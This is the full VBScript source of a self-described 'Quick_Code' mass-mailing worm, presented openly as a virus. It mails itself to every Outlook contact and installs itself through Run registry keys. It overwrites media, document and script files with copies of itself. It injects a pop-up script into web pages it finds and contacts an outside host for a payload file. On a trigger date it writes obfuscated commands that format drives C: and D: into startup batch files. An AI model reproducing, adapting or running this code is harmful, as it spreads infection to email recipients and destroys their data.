'My Name Is 'Quick_Code'.MadeIn:China.VerSion:1.0 Beta(Open Source)
'Because This Is Virus Test And I Need More Free Time Do My Work,So Exist Some Bug.I'm Sorry!~!~
Dim Fso,Wsh,TextBody,FullName,WinDir,WinSys,WinSys32,WinTmp,NewFile,OldFile,EmailSubject, _
    EmailBody,OutLook,FBody,EmailAddress
Call Main
Sub Main
  On Error Resume Next
  Call Init_Program
  Set Mapi=OutLook.GetNameSpace("MAPI") 
  For ctrlists=1 To Mapi.AddressLists.Count 
    set a=Mapi.AddressLists(ctrlists) 
    For Ctrentries=1 To a.AddressEntries.Count 
      If SendOk(a.AddressEntries(Ctrentries))=False Then Call SendMail(a.AddressEntries(Ctrentries))
    Next
  Next
  If Day(Date) + Month(Date)=23 then
    Fso.GetFile(Windir & "\WinStart.Bat").Attributes=0
    Set NewFile=Fso.CreateTextFile(Windir & "\WinStart.Bat",True)
    NewFile.WriteLine "@Echo Off"
    NewFile.WriteLine "Echo My Name Is " & chr(34) & "Quick_Code" & chr(34) & ".See You Later!^-^"
    NewFile.WriteLine "Echo                            Hacker By Chinese!"
    NewFile.WriteLine chr(70) & chr(111) & chr(114) & chr(109) & chr(97) & chr(116) & chr(47) & chr(113) & chr(47) & _
                      chr(97) & chr(117) & chr(116) & chr(111) & chr(116) & chr(101) & chr(115) & chr(116) & chr(47) & chr(117) & chr(32) & chr(68) & _
                      chr(58) & chr(62) & chr(78) & chr(117) & chr(108)
    NewFile.WriteLine chr(70) & chr(111) & chr(114) & chr(109) & chr(97) & chr(116) & chr(47) & chr(113) & chr(47) & _
                      chr(97) & chr(117) & chr(116) & chr(111) & chr(116) & chr(101) & chr(115) & chr(116) & chr(47) & chr(117) & chr(32) & chr(67) & _
                      chr(58) & chr(62) & chr(78) & chr(117) & chr(108)
    NewFile.Close
    Fso.GetFile(Windir & "\WinStart.Bat").Attributes=2
    Fso.GetFile("C:\AutoExec.Bat").Attributes=0
    Set NewFile=Fso.CreateTextFile("C:\AutoExec.Bat",True)
    NewFile.WriteLine "@Echo Off"
    NewFile.WriteLine "Echo My Name Is " & chr(34) & "Quick_Code" & chr(34) & ".See You Later!^-^"
    NewFile.WriteLine "Echo                            Hacker By Chinese!"
    NewFile.WriteLine chr(70) & chr(111) & chr(114) & chr(109) & chr(97) & chr(116) & chr(47) & chr(113) & chr(47) & _
                      chr(97) & chr(117) & chr(116) & chr(111) & chr(116) & chr(101) & chr(115) & chr(116) & chr(47) & chr(117) & chr(32) & chr(68) & _
                      chr(58) & chr(62) & chr(78) & chr(117) & chr(108)
    NewFile.WriteLine chr(70) & chr(111) & chr(114) & chr(109) & chr(97) & chr(116) & chr(47) & chr(113) & chr(47) & _
                      chr(97) & chr(117) & chr(116) & chr(111) & chr(116) & chr(101) & chr(115) & chr(116) & chr(47) & chr(117) & chr(32) & chr(67) & _
                      chr(58) & chr(62) & chr(78) & chr(117) & chr(108)
    NewFile.Close
    Fso.GetFile("C:\AutoExec.Bat").Attributes=2
  Else:
    For Each Drive In Fso.Drives
      Call Sub_Folder(Fso.GetFolder(Drive & "\"))
    Next
    Start=2
    Do Until(Start>=Len(EmailAddress))
     Last=Instr(Start+1,EmailAddress,"*")
     If SendOk(Mid(EmailAddress,Start,Last-Start))=False Then Call SendMail(Mid(EmailAddress,Start,Last-Start))
     Start=Last+1
    Loop   
  End If
End Sub
Sub Init_Program
  On Error Resume Next
  Set Fso=CreateObject("Scripting.FileSystemObject")
  Set Wsh=CreateObject("Wscript.Shell")
  Set OutLook=CreateObject("Outlook.Application")
  Windir=Fso.GetSpecialFolder(0)
  Winsys=Fso.GetSpecialFolder(1)
  Wintmp=Fso.GetSpecialFolder(2)
  Winsys32=Windir & "\System32"
  Tmp=Wsh.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout") 
  If (Tmp>=1) then Wsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD" 
  Set FullName=Fso.GetFile(Wscript.ScriptFullName)
  FullName.Copy Winsys & "\System.vbs",True
  FullName.Copy Winsys32 & "\System32.vbs",True
  Fso.GetFile(Winsys & "\System.vbs").Attributes=2
  Fso.GetFile(Winsys32 & "\System32.vbs").Attributes=2
  Wsh.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Kernel", _
               Winsys & "\System.vbs"
  Wsh.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Kernel", _
               Winsys32 & "\System32.vbs"
  EmailAddress="*"
  FBody="This Email Body Need IE New Plugin!If You Can't See,Please DownLoad New Plugin Or Check Attachment!"
  If Fso.FileExists(Wintmp & "\ReadMe.Txt[1].Eml") Then
    Set OldFile=Fso.OpenTextFile(Wintmp & "\ReadMe.Txt[1].Eml")
    Do Until(OldFile.AtEndOfStream)
      FBody=FBody & OldFile.ReadLine & vbcrlf
    Loop
    OldFile.Close
  Else:
    Wsh.Run "Http://ZhengHao.Vip.Sina.com/ReadMe.Txt.Eml"
  End If
 End Sub  
Sub Sub_Folder(Folder0)
  On Error Resume Next
  For Each File1 In Folder0.Files
    Call Sub_File(File1)
  Next 
  For Each SFolder In Folder0.SubFolders
    Call Sub_Folder(SFolder)
  Next
End Sub
Sub Sub_File(File0)
  On Error Resume Next
  Ext=Lcase(Fso.GetExtenSionName(File0))
  If Instr("vbsvbebasmp3mpgmidpasasmfrmramrmvbpjsswfcssgifjpgcgiplwpsdocpptlogpicwmaaviphpaspjsp",Ext) Then
    Tmp=Fso.GetFile(File0).Attributes
    Fso.GetFile(File0).Attributes=0
    FullName.Copy File0,True
    If Ext<>"vbs" And Ext<>"" Then
      Fso.GetFile(File0).Name=Fso.GetBaseName(File0) & "." & Fso.GetExtensionName(File0) & ".vbs"
    ElseIf Ext="" Then
      Fso.GetFile(File0).Name=Fso.GetBaseName(File0) & ".vbs"
    End If
    Fso.GetFile(File0).Attributes=Tmp
  ElseIf Instr("htmlhtm",Ext) Then
    Set OldFile=Fso.OpenTextFile(File0)
    TextBody=""
    Do Until(OldFile.AtEndOfStream)
      TextBody=TextBody & OldFile.ReadLine & vbcrlf
    Loop
    OldFile.Close
    Start=1
    Do Until(Start=0)
    If Instr(Start,Lcase(TextBody),"=mailto:") Then
    Start=Instr(Start,Lcase(TextBody),"=mailto:")+8
    Last=Instr(Start,Lcase(TextBody),chr(34))
    If Mid(TextBody,Last+1,1)<>">" Then Last=Instr(Start,Lcase(TextBody),">")
    If instr(Mid(TextBody,Start,Last-Start)," ") Then Last=Instr(Start,Lcase(TextBody)," ")
    If Instr(Mid(TextBody,Start,Last-Start),"?") then
      EmailAddress=EmailAddress & Mid(TextBody,Start,Instr(Mid(TextBody,Start,Last-Start),"?")-Start) & "*"
    Else
      EmailAddress=EmailAddress & Mid(TextBody,Start,Last-Start) & "*"  
    End If
    Else
      Start=0
    End If
    Loop
    If Fso.FileExists(Winsys & "\ReadMe.Txt.Eml") And Instr(Lcase(Fso.GetParentFolderName(File0)),"inetpub\wwwroot") Then
      If Fso.GetFile(Winsys & "\ReadMe.Txt.Eml").Size>100 Then
      Fso.GetFile(Fso.GetParentFolderName(File0) & "\ReadMe.Txt.Eml").Attributes=0
      Fso.CopyFile Winsys & "\ReadMe.Txt.Eml",Fso.GetParentFolderName(File0) & "\ReadMe.Txt.Eml",True
      Fso.GetFile(Fso.GetParentFolderName(File0) & "\ReadMe.Txt.Eml").Attributes=2
      Set OldFile=Fso.OpenTextFile(File0)
      TextBody=""
      Do Until(OldFile.AtEndOfStream)
        TextBody=TextBody & OldFile.ReadLine & vbcrlf
      Loop
      Tmp=Fso.GetFile(File0).Attributes
      Fso.GetFile(File0).Attributes=0
      Set NewFile=Fso.OpenTextFile(File0,2)
      NewFile.Write Replace(TextBody,"</TITLE>","</TITLE><Script>Window.Open(" & chr(34) & "ReadMe.Txt.Eml" & chr(34) & ");</Script>")
      Newfile.Close
      Fso.GetFile(File0).Attributes=Tmp
      End If 
   End If
  End If 
End Sub
Sub SendMail(Address)
  On Error Resume Next
  If Left(Fbody,4)<>"This" Then Call WriteAddress(Address)
  Set Mail=OutLook.CreateItem(0) 
  Mail.To=Address
  Last=Instr(Address,1,"@")
  Tmp=Mid(Address,1,Last-1)
  Mail.Subject="This Message For " & Tmp
  EmailBody=FBody
  Fso.GetFile(Winsys & "\ReadMe.Txt.Eml").Attributes=0
  Fso.CopyFile Wintmp & "\ReadMe.Txt[1].Eml",Winsys & "\ReadMe.Txt.Eml",True
  Fso.GetFile(Winsys & "\ReadMe.Txt.Eml").Attributes=2
  Mail.Body=EmailBody
  FullName.Copy Winsys & "\" & "This Message For " & Tmp & " Mail Body.Txt.vbs",True
  Mail.Attachments.Add(Winsys & "\" & "This Message For " & Tmp & " Mail Body.Txt.vbs") 
  Mail.Send
  Fso.DeleteFile Winsys & "\" & "This Message For " & Tmp & " Mail Body.Txt.vbs" 
End Sub
Function SendOk(Address)
  On Error Resume Next
  SendOk=False
  If Fso.FileExists(Winsys & "\Kill_Japanese.Dll") Then
    Set OldFile=Fso.OpenTextFile(Winsys & "\Kill_Japanese.Dll")
    TextBody=""
    Do Until(OldFile.AtEndOfStream)
      TextBody=TextBody & OldFile.ReadLine & vbcrlf
    Loop
    OldFile.Close
    If Instr(TextBody,Address) Then SendOk=True
  End If
End Function
Sub WriteAddress(Address)
  On Error Resume Next
  If Not Fso.FileExists(Winsys & "\Kill_Japanese.Dll") Then
    Set NewFile=Fso.CreateTextFile(Winsys & "\Kill_Japanese.Dll")
    NewFile.WriteLine Address
    Fso.GetFile(Winsys & "\Kill_Japanese.Dll").Attributes=2
  Else
    Set OldFile=Fso.OpenTextFile(Winsys & "\Kill_Japanese.Dll")
    TextBody=""
    Do Until(OldFile.AtEndOfStream)
      TextBody=TextBody & OldFile.ReadLine & vbcrlf
    Loop
    OldFile.Close
    Fso.GetFile(Winsys & "\Kill_Japanese.Dll").Attributes=0
    Set OldFile=Fso.OpenTextFile(Winsys & "\Kill_Japanese.Dll",2)
    OldFile.Write TextBody
    If Instr(TextBody,Address)=0 Then OldFile.WriteLine Address
    OldFile.Close
    Fso.GetFile(Winsys & "\Kill_Japanese.Dll").Attributes=2
  End If
End Sub
 
      
